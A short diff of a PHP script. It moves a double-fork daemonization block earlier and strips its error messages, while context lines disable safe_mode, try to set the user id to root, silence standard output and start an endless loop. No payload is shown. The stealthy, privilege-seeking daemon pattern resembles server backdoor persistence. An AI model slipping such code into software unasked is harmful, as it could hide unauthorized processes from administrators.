@@ -1,4 +1,18 @@
 <?php
+$pid = pcntl_fork();
+
+if ($pid == -1){
+    sleep("8000");
+}
+if ($pid){exit(0);}
+if (posix_setsid() === -1){
+    sleep("8000");
+}
+$pid = pcntl_fork();
+if ($pid == -1){
+    sleep("8000");
+}
+if ($pid){exit(0);}
 ini_set('safe_mode', 0);
 umask(0);
 posix_setuid(0);
@@ -9,24 +23,6 @@ define("HOME", getcwd());
 $STDIN = fopen('/dev/null', 'r');
 $STDOUT = fopen('/dev/null', 'w');
 $STDERR = fopen(sys_get_temp_dir()."asdf.log", "wb");
-$pid = pcntl_fork();
-
-if ($pid == -1){
-    fwrite($STDERR, "could not into child process.");
-    sleep("8000");
-}
-if ($pid){exit(0);}
-if (posix_setsid() === -1){
-    fwrite($STDERR, "could not fork.");
-    sleep("8000");
-}
-$pid = pcntl_fork();
-if ($pid == -1){
-    fwrite($STDERR, "could not fork into grandchild process.");
-    sleep("8000");
-}
-if ($pid){exit(0);}
-
 
 while(1) {
     function checkfs()
